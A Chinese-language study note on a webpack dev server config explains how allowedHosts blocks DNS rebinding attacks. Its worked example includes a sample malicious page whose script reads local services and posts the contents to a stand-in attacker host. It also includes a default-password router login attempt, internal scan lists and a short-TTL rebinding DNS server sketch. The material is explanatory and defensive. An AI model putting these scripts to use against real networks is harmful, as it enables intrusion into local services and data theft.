## webpack dev server config

```js
"use strict";

const fs = require("fs");
const evalSourceMapMiddleware = require("react-dev-utils/evalSourceMapMiddleware");
const noopServiceWorkerMiddleware = require("react-dev-utils/noopServiceWorkerMiddleware");
const ignoredFiles = require("react-dev-utils/ignoredFiles");
const redirectServedPath = require("react-dev-utils/redirectServedPathMiddleware");
const paths = require("./paths");
const getHttpsConfig = require("./getHttpsConfig");

const host = process.env.HOST || "0.0.0.0";
const sockHost = process.env.WDS_SOCKET_HOST;
const sockPath = process.env.WDS_SOCKET_PATH; // default: '/ws'
const sockPort = process.env.WDS_SOCKET_PORT;

module.exports = function (proxy, allowedHost) {
  const disableFirewall =
    !proxy || process.env.DANGEROUSLY_DISABLE_HOST_CHECK === "true";
  return {
    // WebpackDevServer 2.4.3 introduced a security fix that prevents remote
    // websites from potentially accessing local content through DNS rebinding:
    // https://github.com/webpack/webpack-dev-server/issues/887
    // https://medium.com/webpack/webpack-dev-server-middleware-security-issues-1489d950874a
    // However, it made several existing use cases such as development in cloud
    // environment or subdomains in development significantly more complicated:
    // https://github.com/facebook/create-react-app/issues/2271
    // https://github.com/facebook/create-react-app/issues/2233
    // While we're investigating better solutions, for now we will take a
    // compromise. Since our WDS configuration only serves files in the `public`
    // folder we won't consider accessing them a vulnerability. However, if you
    // use the `proxy` feature, it gets more dangerous because it can expose
    // remote code execution vulnerabilities in backends like Django and Rails.
    // So we will disable the host check normally, but enable it if you have
    // specified the `proxy` setting. Finally, we let you override it if you
    // really know what you're doing with a special environment variable.
    // Note: ["localhost", ".localhost"] will support subdomains - but we might
    // want to allow setting the allowedHosts manually for more complex setups
    allowedHosts: disableFirewall ? "all" : [allowedHost],
    headers: {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "*",
      "Access-Control-Allow-Headers": "*",
    },
    // Enable gzip compression of generated files.
    compress: true,
    static: {
      // By default WebpackDevServer serves physical files from current directory
      // in addition to all the virtual build products that it serves from memory.
      // This is confusing because those files won’t automatically be available in
      // production build folder unless we copy them. However, copying the whole
      // project directory is dangerous because we may expose sensitive files.
      // Instead, we establish a convention that only files in `public` directory
      // get served. Our build script will copy `public` into the `build` folder.
      // In `index.html`, you can get URL of `public` folder with %PUBLIC_URL%:
      // <link rel="icon" href="%PUBLIC_URL%/favicon.ico">
      // In JavaScript code, you can access it with `process.env.PUBLIC_URL`.
      // Note that we only recommend to use `public` folder as an escape hatch
      // for files like `favicon.ico`, `manifest.json`, and libraries that are
      // for some reason broken when imported through webpack. If you just want to
      // use an image, put it in `src` and `import` it from JavaScript instead.
      directory: paths.appPublic,
      publicPath: [paths.publicUrlOrPath],
      // By default files from `contentBase` will not trigger a page reload.
      watch: {
        // Reportedly, this avoids CPU overload on some systems.
        // https://github.com/facebook/create-react-app/issues/293
        // src/node_modules is not ignored to support absolute imports
        // https://github.com/facebook/create-react-app/issues/1065
        ignored: ignoredFiles(paths.appSrc),
      },
    },
    client: {
      webSocketURL: {
        // Enable custom sockjs pathname for websocket connection to hot reloading server.
        // Enable custom sockjs hostname, pathname and port for websocket connection
        // to hot reloading server.
        hostname: sockHost,
        pathname: sockPath,
        port: sockPort,
      },
      overlay: {
        errors: true,
        warnings: false,
      },
    },
    devMiddleware: {
      // It is important to tell WebpackDevServer to use the same "publicPath" path as
      // we specified in the webpack config. When homepage is '.', default to serving
      // from the root.
      // remove last slash so user can land on `/test` instead of `/test/`
      publicPath: paths.publicUrlOrPath.slice(0, -1),
    },

    https: getHttpsConfig(),
    host,
    historyApiFallback: {
      // Paths with dots should still use the history fallback.
      // See https://github.com/facebook/create-react-app/issues/387.
      disableDotRule: true,
      index: paths.publicUrlOrPath,
    },
    // `proxy` is run between `before` and `after` `webpack-dev-server` hooks
    proxy,
    onBeforeSetupMiddleware(devServer) {
      // Keep `evalSourceMapMiddleware`
      // middlewares before `redirectServedPath` otherwise will not have any effect
      // This lets us fetch source contents from webpack for the error overlay
      devServer.app.use(evalSourceMapMiddleware(devServer));

      if (fs.existsSync(paths.proxySetup)) {
        // This registers user provided middleware for proxy reasons
        require(paths.proxySetup)(devServer.app);
      }
    },
    onAfterSetupMiddleware(devServer) {
      // Redirect to `PUBLIC_URL` or `homepage` from `package.json` if url not match
      devServer.app.use(redirectServedPath(paths.publicUrlOrPath));

      // This service worker file is effectively a 'no-op' that will reset any
      // previous service worker registered for the same host:port combination.
      // We do this in development to avoid hitting the production cache if
      // it used the same host and port.
      // https://github.com/facebook/create-react-app/issues/2272#issuecomment-302832432
      devServer.app.use(noopServiceWorkerMiddleware(paths.publicUrlOrPath));
    },
  };
};
```

### allowedHosts - 主机安全检查

作用：

- 安全限制，防止 DNS 重绑定攻击

- 当使用 proxy 时更严格，否则允许所有主机访问

#### allowedHosts 可以防止 dns 重绑定攻击，dns 重绑定攻击是什么，防御原理又是什么

##### DNS 重绑定攻击（DNS Rebinding Attack）

- 这是一种利用 DNS 机制绕过同源策略（Same-Origin Policy）的攻击方式。

##### 攻击原理

1. 同源策略的限制

   - 浏览器只允许网页访问相同协议、域名、端口的资源。

2. DNS 的工作方式
   - 域名解析为 IP 地址
   - DNS 响应有 TTL（生存时间）
   - 浏览器缓存 DNS 结果

##### 攻击案例

```
情景设定
假设你是一个开发者：

在本地运行Webpack Dev Server：http://localhost:3000

还在运行一个本地数据库管理界面：http://localhost:8081/phpmyadmin

公司内网有个路由器：http://192.168.1.1


攻击者的准备
1. 攻击者注册一个域名
evil-attacker.com

2. 攻击者设置特殊的DNS服务器
// DNS服务器配置：
evil-attacker.com 解析到:
- 第一秒: 45.33.32.65 (攻击者自己的服务器IP)
- 第二秒: 127.0.0.1 (你的本地机器)
- TTL: 1秒 (非常短的生存时间)

攻击过程 - 像看电影一样
第一幕：你访问了恶意网站
# 周一早上，你收到一封邮件：
"恭喜！你获得了免费Starbucks咖啡券！"
# 你点击链接：http://evil-attacker.com


第二幕：恶意页面加载
<!-- evil-attacker.com 的页面看起来很正常 -->
<!DOCTYPE html>
<html>
<head>
    <title>免费咖啡券！</title>
</head>
<body>
    <h1>填写信息领取咖啡券</h1>
    <script>
        // 这里隐藏着恶意代码
        const maliciousScript = `
            setTimeout(() => {
                // 1. 尝试访问你的本地开发服务
                fetch('http://evil-attacker.com:3000/')
                    .then(res => res.text())
                    .then(data => {
                        if (data.includes('webpack')) {
                            // 发现了开发服务器！
                            fetch('https://real-attacker-server.com/log', {
                                method: 'POST',
                                body: JSON.stringify({
                                    type: 'dev_server_found',
                                    content: data
                                })
                            });
                        }
                    });

                // 2. 尝试访问数据库管理界面
                fetch('http://evil-attacker.com:8081/phpmyadmin')
                    .then(res => res.text())
                    .then(data => {
                        // 窃取数据库信息
                    });

                // 3. 扫描内网设备
                for (let i = 1; i < 255; i++) {
                    fetch(\`http://evil-attacker.com/\${i}:80\`)
                        .catch(() => {});
                }
            }, 2000);
        `;

        // 执行恶意代码
        eval(maliciousScript);
    </script>
</body>
</html>

第三幕：DNS魔术开始
时间线：

T=0秒 - 你点击链接
你的浏览器: "DNS服务器，evil-attacker.com 的IP是多少？"
DNS服务器: "是 45.33.32.65 (攻击者服务器)"
浏览器缓存这个结果1秒

T=1秒 - 页面加载完成，恶意代码准备执行
DNS缓存过期


T=2秒 - 恶意代码开始执行
// 浏览器要访问 evil-attacker.com:3000
// 首先需要重新解析域名
// 浏览器: "DNS服务器，evil-attacker.com 的IP是多少？"
// DNS服务器: "现在是 127.0.0.1 (你的本地机器)"


第四幕：绕过同源策略的关键
// 浏览器看到：
fetch('http://evil-attacker.com:3000/')

// 浏览器思考：
// 1. 当前页面来源：http://evil-attacker.com (来自 45.33.32.65)
// 2. 请求目标：http://evil-attacker.com:3000 (现在解析到 127.0.0.1)
// 3. 判断：域名都是 evil-attacker.com → 同源！允许访问！

// 但实际上：
// 请求从 evil-attacker.com (45.33.32.65) 发向 evil-attacker.com (127.0.0.1)
// 完全绕过了同源策略！


如果Webpack Dev Server没有防御...
请求到达你的开发服务器 (127.0.0.1:3000)

HTTP请求：
GET / HTTP/1.1
Host: evil-attacker.com:3000  ← 注意这个Host头！
Accept: */*
Origin: http://evil-attacker.com  ← 来源也是evil-attacker.com

你的Dev Server看到：
- Host: evil-attacker.com:3000
- 检查 allowedHosts 配置
- 如果是 'all' 或包含 'evil-attacker.com'
- 允许访问！返回数据给攻击者



更危险的场景：有proxy配置时
// 你的devserver配置
devServer: {
  proxy: {
    '/api': {
      target: 'http://localhost:8080',  // 你的后端API
      pathRewrite: {'^/api': ''}
    }
  }
}

攻击者可以：
// 通过你的dev server访问后端API
fetch('http://evil-attacker.com:3000/api/users')

// Dev Server会：
// 1. 接收请求 (Host: evil-attacker.com:3000)
// 2. 如果 allowedHosts 不严格
// 3. 代理到 http://localhost:8080/users
// 4. 返回敏感用户数据！
```

现实中的攻击目标

```
// 常见本地服务端口
const commonPorts = [3000, 8080, 8081, 9000, 4200, 8000];
const services = {
  3000: 'React开发服务器',
  8080: 'Spring Boot后端',
  8081: '数据库管理',
  9000: 'Angular开发服务器',
  3306: 'MySQL数据库',
  6379: 'Redis数据库',
  27017: 'MongoDB数据库'
};

// 攻击者可以扫描这些端口

// 常见内网IP段
const internalRanges = [
  '192.168.0.',  // 家庭网络
  '192.168.1.',  // 常见路由器
  '10.0.0.',     // 企业网络
  '172.16.0.'    // 大型网络
];

// 攻击路由器管理界面
fetch('http://evil-attacker.com/')  // 实际是 192.168.1.1
  .then(res => res.text())
  .then(html => {
    if (html.includes('路由器登录')) {
      // 尝试默认密码
      fetch('http://evil-attacker.com/login', {
        method: 'POST',
        body: 'username=admin&password=admin'
      });
    }
  });
```

为什么这个攻击很隐蔽？

1. 用户完全不知情

   - 只是访问了一个普通网站

   - 没有下载任何软件

   -没有输入任何密码

2. 利用了浏览器正常功能

   - DNS 解析是正常的

   - 同源策略是正常工作的

   - JavaScript fetch 是正常 API

##### allowedhosts 是如何防止 dns 重绑定攻击的

```
正确的防御配置：
devServer: {
  allowedHosts: ['localhost', '127.0.0.1', '.mycompany.com']
  // 只允许这些主机访问
}

防御过程：
恶意请求到达：

HTTP请求：
GET / HTTP/1.1
Host: evil-attacker.com:3000  ← 关键在这里！

Dev Server检查：
1. 提取Host头：evil-attacker.com:3000
2. 去掉端口：evil-attacker.com
3. 检查是否在 allowedHosts 列表中
4. evil-attacker.com 不在列表中！
5. 拒绝请求！返回403 Forbidden

```

##### 这个问题主要利用 DNS TTL 机制：快速变更 IP 地址，进行攻击。什么是 dns ttl 机制

DNS TTL 机制详解：TTL 是 Time To Live（生存时间）的缩写，它是 DNS 系统中一个非常重要的安全和控制机制。

TTL 是一个时间值（单位：秒），表示：

- DNS 记录可以被缓存多久

- 缓存过期后，需要重新查询

- 由域名管理员设置

DNS 查询过程（带 TTL）

```
// 模拟DNS查询过程
const dnsQuery = {
  domain: "github.com",
  step1: "浏览器检查本地缓存",
  step2: "本地缓存没有 → 查询系统DNS缓存",
  step3: "系统缓存没有 → 查询ISP的DNS服务器",
  step4: "ISP服务器返回：IP = 140.82.121.3, TTL = 600秒",
  step5: "浏览器缓存这个结果600秒"
};
```

不同的 TTL 策略

```
# 各种网站的TTL策略示例：

长期稳定的网站:
- google.com: TTL = 300秒 (5分钟)
- facebook.com: TTL = 600秒 (10分钟)
- 银行官网: TTL = 3600秒 (1小时)

经常变化的服务:
- CDN节点: TTL = 30-60秒 (快速切换)
- 负载均衡: TTL = 20秒 (快速故障转移)
- 云服务: TTL = 10秒 (弹性伸缩)

特殊用途:
- 故障转移: TTL = 5秒 (极速切换)
- DNS重绑定攻击: TTL = 1秒 (快速变化)
```

案例 1：Google 的 TTL 策略

```
; Google使用较短的TTL实现全球负载均衡
google.com.       300 IN A 142.250.185.174  ; 5分钟TTL
www.google.com.   300 IN A 142.250.185.174

; 但不同地区可能返回不同IP
; 亚洲用户: 172.217.24.14
; 欧洲用户: 216.58.213.174
; TTL短才能快速切换

```

案例 2：Cloudflare 的任播网络

```
; Cloudflare利用短TTL实现智能路由
cloudflare.com.   30 IN A 104.17.210.9     ; 仅30秒TTL

; 根据用户位置和网络状况
; 动态返回最近的服务器IP
; 短TTL确保变化快速生效
```

案例 3：攻击者的配置

```
# 攻击者DNS服务器代码示例
from dnslib import *

def handle_dns_request(request):
    domain = str(request.q.qname)

    if domain == "evil-attacker.com.":
        # 动态改变IP
        current_time = time.time()
        if current_time % 2 < 1:  # 每秒切换
            ip = "45.33.32.65"   # 攻击者服务器
        else:
            ip = "127.0.0.1"     # 用户本地

        # 设置极短TTL
        reply = request.reply()
        reply.add_answer(
            RR(domain, QTYPE.A,
               rdata=A(ip),
               ttl=1)  # TTL=1秒！
        )
        return reply
```
